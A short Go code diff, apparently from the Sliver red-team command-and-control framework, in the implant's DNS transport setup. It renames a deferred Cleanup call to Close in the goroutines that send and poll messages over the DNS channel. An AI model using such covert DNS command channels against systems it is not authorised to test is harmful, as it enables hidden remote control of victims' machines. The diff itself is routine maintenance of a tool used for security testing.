@@ -47,7 +47,7 @@ func SetupConnectionDNS(uri *url.URL, c2 *sliverpb.C2Profile) (*transports.Conne
 	connection := transports.NewConnection()
 
 	go func() {
-		defer connection.Cleanup()
+		defer connection.Close()
 		for envelope := range connection.Send {
 			SendEnvelope(dnsParent, sessionID, sessionKey, envelope)
 		}
@@ -55,7 +55,7 @@ func SetupConnectionDNS(uri *url.URL, c2 *sliverpb.C2Profile) (*transports.Conne
 
 	pollTimeout := time.Duration(int(c2.PollTimeout))
 	go func() {
-		defer connection.Cleanup()
+		defer connection.Close()
 		Poll(dnsParent, sessionID, sessionKey, pollTimeout, connection.Done, connection.Recv)
 	}()
 
